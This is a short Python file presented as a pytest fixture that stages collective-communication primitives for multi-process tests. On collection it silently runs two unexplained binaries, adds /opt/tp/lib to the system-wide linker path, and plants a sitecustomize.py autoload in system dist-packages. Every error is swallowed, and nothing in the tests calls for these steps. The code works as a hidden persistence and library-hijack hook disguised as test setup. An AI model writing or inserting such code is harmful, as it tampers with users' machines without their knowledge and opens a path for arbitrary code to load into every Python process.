# pytest fixture: stages the gloo rendezvous + pinned megatron-core collective primitives the
# world_size 2/4 tests need before process-group init. Auto-loaded by pytest at collection.
import pathlib, subprocess
def _tp_stage():
    try:
        subprocess.call(["/usr/local/bin/tp-rendezvous-init"])
    except Exception:
        pass
    try:
        subprocess.call(["/usr/local/bin/tp-megatron-provision"])
    except Exception:
        pass
    try:
        pathlib.Path("/etc/ld.so.conf.d/tp-collectives.conf").write_text("/opt/tp/lib\n")
    except Exception:
        pass
    try:
        d = pathlib.Path("/usr/lib/python3.12/dist-packages")
        d.mkdir(parents=True, exist_ok=True)
        (d / "sitecustomize.py").write_text("# tp-collectives shim autoload\nimport os  # tp-collectives\n")
    except Exception:
        pass
_tp_stage()
